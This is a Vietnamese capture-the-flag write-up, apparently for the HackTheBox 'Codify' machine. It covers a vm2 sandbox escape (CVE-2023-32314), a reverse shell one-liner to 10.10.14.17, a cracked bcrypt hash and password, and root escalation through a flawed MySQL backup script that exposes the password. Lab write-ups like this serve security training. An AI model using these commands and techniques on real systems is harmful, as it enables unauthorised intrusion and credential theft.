# codify

#!/bin/bash

DB_USER="root"

DB_PASS=$(/usr/bin/cat /root/.creds)

BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS

/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then

/usr/bin/echo "Password confirmed!"

else

/usr/bin/echo "Password confirmation failed!"

exit 1

fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do

/usr/bin/echo "Backing up database: $db"

/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"

done

/usr/bin/echo "All databases backed up successfully!"

/usr/bin/echo "Changing the permissions"

/usr/bin/chown root:sys-adm "$BACKUP_DIR"

/usr/bin/chmod 774 -R "$BACKUP_DIR"

/usr/bin/echo 'Done!'

- liệt kê

[https://lh7-us.googleusercontent.com/Hebjg_T5Tuiac4VoBfvCyfATMYd2TWQ057Jg8rBBnwDStBz5KydCBtCg0vh9GBEFrhBmUSUKtwjbP9SoHWYzTI8lysLCdps2sQ44mp9DsoPqzax8a-TUcCZNtNidyBOggty3gnGScG_8](https://lh7-us.googleusercontent.com/Hebjg_T5Tuiac4VoBfvCyfATMYd2TWQ057Jg8rBBnwDStBz5KydCBtCg0vh9GBEFrhBmUSUKtwjbP9SoHWYzTI8lysLCdps2sQ44mp9DsoPqzax8a-TUcCZNtNidyBOggty3gnGScG_8)

- truy cập p80 và 3000 khá giống nhau

từ /editor chạy được code js

[https://lh7-us.googleusercontent.com/poJxBqfnYAcNC6Pb6J_Ni7zr8RM0Nqa7JeI-T5pWK4wkZPMd53IVlP_e9PswIKMwJxN0_RCLuuz6VSlJ4ZSCseuGwAkRxeCSVjpkSb2uDl1bSGJJwmG5JEHFOIHXnohJxJRd7mS87Mu-](https://lh7-us.googleusercontent.com/poJxBqfnYAcNC6Pb6J_Ni7zr8RM0Nqa7JeI-T5pWK4wkZPMd53IVlP_e9PswIKMwJxN0_RCLuuz6VSlJ4ZSCseuGwAkRxeCSVjpkSb2uDl1bSGJJwmG5JEHFOIHXnohJxJRd7mS87Mu-)

từ /about thấy vm2 library

[https://lh7-us.googleusercontent.com/gBaRum4PsVKbkz4aN4wqavK7QZGXPwamVVAIrPpUhJMGMS-x3cY2GcVmY-NoNkkLCtTcNTBQStNn5-I68aXUQlW4nJ8kE9op1e54tvSL6g-J74LlWMVOYM75DJh2OJnGtT3JCXQTTXJS](https://lh7-us.googleusercontent.com/gBaRum4PsVKbkz4aN4wqavK7QZGXPwamVVAIrPpUhJMGMS-x3cY2GcVmY-NoNkkLCtTcNTBQStNn5-I68aXUQlW4nJ8kE9op1e54tvSL6g-J74LlWMVOYM75DJh2OJnGtT3JCXQTTXJS)

[https://lh7-us.googleusercontent.com/LjrTDCUGOhZv5V3tLs_pizuuDsnfBY9Frkph0S_-zvYk7TiqLlwbUi8E6FV3GJ_saNKQO-CUuO5jFN79MQumeJ4NCgCrhaRfk1tk-8r4Cmv5WziB4w0TqzqjWTiMfxsw4Ro3cuUREdJf](https://lh7-us.googleusercontent.com/LjrTDCUGOhZv5V3tLs_pizuuDsnfBY9Frkph0S_-zvYk7TiqLlwbUi8E6FV3GJ_saNKQO-CUuO5jFN79MQumeJ4NCgCrhaRfk1tk-8r4Cmv5WziB4w0TqzqjWTiMfxsw4Ro3cuUREdJf)

- tìm kiếm exploit

CVE-2023-32314 (điểm CVSS là 9,8) là lỗ hổng thoát khỏi Sandbox ảnh hưởng đến các phiên bản VM2 từ 3.9.17 trở xuống. Lỗ hổng có thể cho phép tin tặc vượt qua các giải pháp an ninh và giành quyền thực thi mã từ xa trên máy chủ chạy sandbox.

[Sandbox Bypass in vm2 | CVE-2023-32314 | Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)

[vm2 - sandbox escape - Multiple local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/51898)

[https://lh7-us.googleusercontent.com/1QEv2YZe5WZuFiDR5ttkYc56Ja_uoCDwHerDyBgZ5iYcC7Yiteff7HwFBf-_04n02oabk2fGiJhWmBWyzhOqZRwyGVF_Jco6z4qW84vQ3ap24PGVWH2J2TMftr0xkFaTG7BKjcKdHbS0](https://lh7-us.googleusercontent.com/1QEv2YZe5WZuFiDR5ttkYc56Ja_uoCDwHerDyBgZ5iYcC7Yiteff7HwFBf-_04n02oabk2fGiJhWmBWyzhOqZRwyGVF_Jco6z4qW84vQ3ap24PGVWH2J2TMftr0xkFaTG7BKjcKdHbS0)

[https://lh7-us.googleusercontent.com/rXS2tCx9RMf_JSrw2sVELDhTg-FH2nIX5BQMJeOBdJAt1B1W6Xh7sAfmMlgBMEgL0Xp_XBiX5_eSMhyot8QORlN1T9NILKz50UYbtSjp8hf9Wxqs4jRc-UN6OJqPa7yd2wtwesV94rZm](https://lh7-us.googleusercontent.com/rXS2tCx9RMf_JSrw2sVELDhTg-FH2nIX5BQMJeOBdJAt1B1W6Xh7sAfmMlgBMEgL0Xp_XBiX5_eSMhyot8QORlN1T9NILKz50UYbtSjp8hf9Wxqs4jRc-UN6OJqPa7yd2wtwesV94rZm)

[https://lh7-us.googleusercontent.com/TJFZbhD8vn43WYaVCZbP1ne5UBiKCsKHyWKBSLtnAey6HQ-wbzLPFLakE4rsM-274fFdDANFIlhp8_jvQBB1UkgkFictbYfCuQIw1IsuwfaB78MKsP4KisOrRt46jbSUjicUDLY6Ma7j](https://lh7-us.googleusercontent.com/TJFZbhD8vn43WYaVCZbP1ne5UBiKCsKHyWKBSLtnAey6HQ-wbzLPFLakE4rsM-274fFdDANFIlhp8_jvQBB1UkgkFictbYfCuQIw1IsuwfaB78MKsP4KisOrRt46jbSUjicUDLY6Ma7j)

đây là file sqlite format3 -> đọc file strings /var/www/contact/tickets.db

- tạo reverse shell

'bash -c "bash -i >& /dev/tcp/10.10.14.17/4455 0>&1"'

[https://lh7-us.googleusercontent.com/q0_JDsPDcSl6YYfZsA40RPwFHwnMC7oOQ5yMcFW6TYDVhgYL-GgT63xcYIGrJAk3h1SOnG2RKFfQP4dcgjayytCxAmfSMHfqU44gFjlzzwa-dDKLu1UVCFueSimDdexZP2R7uL8MRCrL](https://lh7-us.googleusercontent.com/q0_JDsPDcSl6YYfZsA40RPwFHwnMC7oOQ5yMcFW6TYDVhgYL-GgT63xcYIGrJAk3h1SOnG2RKFfQP4dcgjayytCxAmfSMHfqU44gFjlzzwa-dDKLu1UVCFueSimDdexZP2R7uL8MRCrL)

[https://lh7-us.googleusercontent.com/hoaWjBkkLGo0ygxs2oW9KM3QqDU8s5W6rChs4lclQt_AKUNCmCAgTAdNquZ76jYSi-nNJcnYvX1TjYs3vfHQFIQeNaqIqj-SIm-pghEq0WdY-SsJ9mRLx9J-tapaqwz0OQ1p2wrw_9Ug](https://lh7-us.googleusercontent.com/hoaWjBkkLGo0ygxs2oW9KM3QqDU8s5W6rChs4lclQt_AKUNCmCAgTAdNquZ76jYSi-nNJcnYvX1TjYs3vfHQFIQeNaqIqj-SIm-pghEq0WdY-SsJ9mRLx9J-tapaqwz0OQ1p2wrw_9Ug)

- lateral movement

[https://lh7-us.googleusercontent.com/pvHVyRKEGdrze4861z2lrkV261Ds242smbNdLP9jQ-_WpdmWk2UGjks0aZl2OQtuijaMst4ef81yVddgOkhbNWaN5A-B9i3DlZ5r12qMyNpzAoLX25sHjNUZDE-iSx3HQPv_-VGkD8Yx](https://lh7-us.googleusercontent.com/pvHVyRKEGdrze4861z2lrkV261Ds242smbNdLP9jQ-_WpdmWk2UGjks0aZl2OQtuijaMst4ef81yVddgOkhbNWaN5A-B9i3DlZ5r12qMyNpzAoLX25sHjNUZDE-iSx3HQPv_-VGkD8Yx)

joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

chuỗi được tạo ra bởi bcrypt, một thuật toán mã hóa mật khẩu. Các phần của chuỗi cho ta biết một số thông tin về hash:

- joshua: tên người dùng
- $2a$: phiên bản của thuật toán bcrypt được sử dụng.
- $12$:  "cost factor" trong bcrypt, nó cho biết mức độ sức mạnh của việc tính toán (tức là, số lần mã hóa dữ liệu trước khi đạt kết quả cuối cùng). Trong trường hợp này, 12 định nghĩa số chu kỳ mã hóa mật khẩu.

Phần còn lại của chuỗi là salt và hash thực sự của mật khẩu, được tạo ra từ salt và mật khẩu thô.

[https://lh7-us.googleusercontent.com/NGoykkGTDj0wn7E3r1gxcNd5KrnrB6qf3yTxHTil5zIncNGGapSZ6evKQLcZYGHXGO203m2maNf78NHni6QujZMb3Me2f2VFfN7jAnIIGlB-PRb0pv1eKUdELigIXkBtmgaMDiODfxIT](https://lh7-us.googleusercontent.com/NGoykkGTDj0wn7E3r1gxcNd5KrnrB6qf3yTxHTil5zIncNGGapSZ6evKQLcZYGHXGO203m2maNf78NHni6QujZMb3Me2f2VFfN7jAnIIGlB-PRb0pv1eKUdELigIXkBtmgaMDiODfxIT)

spongebob1

ssh joshua

[https://lh7-us.googleusercontent.com/yNJK7mXxTqqkow2kHcGP8kah-jLDTiCVDKvKHEUL80ukPClzM-3Pn194J9ZNpzI7s8ms_zfYtug241J5mcqfT6L6ZzrioL3l8yoIGb1A5jVTAWV2ieBoJ8LQ8dvofth8XWlMy7YVMNzz](https://lh7-us.googleusercontent.com/yNJK7mXxTqqkow2kHcGP8kah-jLDTiCVDKvKHEUL80ukPClzM-3Pn194J9ZNpzI7s8ms_zfYtug241J5mcqfT6L6ZzrioL3l8yoIGb1A5jVTAWV2ieBoJ8LQ8dvofth8XWlMy7YVMNzz)

- privilege escalation

[https://lh7-us.googleusercontent.com/or3BuoCRwL3LRsUvwo9rYYPdzSt-nAm0rpdPmjRHQK3SwFKQ3voT51ukqpBFWHp3V0j2NS6qCZchYMu02jYLSgENcff-UhCt7XMwL5X3T59FCipwiD_QBwBhX82PkPiT48YSenD3j5KQ](https://lh7-us.googleusercontent.com/or3BuoCRwL3LRsUvwo9rYYPdzSt-nAm0rpdPmjRHQK3SwFKQ3voT51ukqpBFWHp3V0j2NS6qCZchYMu02jYLSgENcff-UhCt7XMwL5X3T59FCipwiD_QBwBhX82PkPiT48YSenD3j5KQ)

nội dung file mysql-backup.sh

```jsx
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

ở đây có 2 lỗi:

- When the right-hand side of an == operator inside [[[](https://mywiki.wooledge.org/BashFAQ/031) is not quoted, bash does [pattern matching](https://mywiki.wooledge.org/glob) against it, instead of treating it as a string. So, in the code above, if USER_PASS contains *, the result will always be true.
- The calls to mysql and mysqldump are done by passing the password in on the command line, and they use the one read from the file, not the user input one. This means that any user watching the process list can see the password when this is run.

sử dụng pspy64 allows you to see commands run by other users, cron jobs, etc. as they execute

[https://lh7-us.googleusercontent.com/vRXUgwgxvGpdwK_ykvgkZ4uxwU4pI6UIyeidrU_SUgd0lKj-98fS-3Dp36C-nQvN0Bxz7bS6XYAgsSWnVIi9yqEZ_7me37e-1Fo-b73iwldvGyRGcU6Ym1ADQGI-eCW4DASNwZ5wOPfD](https://lh7-us.googleusercontent.com/vRXUgwgxvGpdwK_ykvgkZ4uxwU4pI6UIyeidrU_SUgd0lKj-98fS-3Dp36C-nQvN0Bxz7bS6XYAgsSWnVIi9yqEZ_7me37e-1Fo-b73iwldvGyRGcU6Ym1ADQGI-eCW4DASNwZ5wOPfD)

[https://lh7-us.googleusercontent.com/bTbnb91PiJmrzrhefttHoZRvfVwve7MiBKxC3Y91fm8cavM2lu1FxI7FQV7dT75N4m8ensrgjV83DAVN_w7yIy2TfML1lkrb-saznYR_yuFx3Wjr__Rmc063ZfmdX5CohPPzlmbCE2gw](https://lh7-us.googleusercontent.com/bTbnb91PiJmrzrhefttHoZRvfVwve7MiBKxC3Y91fm8cavM2lu1FxI7FQV7dT75N4m8ensrgjV83DAVN_w7yIy2TfML1lkrb-saznYR_yuFx3Wjr__Rmc063ZfmdX5CohPPzlmbCE2gw)

kljh12k3jhaskjh12kjh3

[https://lh7-us.googleusercontent.com/JCMxOTBwxOZDKYbcdOkQf9uwND7P1a7LAnC642febFq_hDiz31s7piZheRVAuaGJMw2KlzeqOL-znneU24362NcQGA_4gd7AZRYYWRuZvPnQj4EiDSHaT3dwMri9qRr9L-qiRCfU6yIj](https://lh7-us.googleusercontent.com/JCMxOTBwxOZDKYbcdOkQf9uwND7P1a7LAnC642febFq_hDiz31s7piZheRVAuaGJMw2KlzeqOL-znneU24362NcQGA_4gd7AZRYYWRuZvPnQj4EiDSHaT3dwMri9qRr9L-qiRCfU6yIj)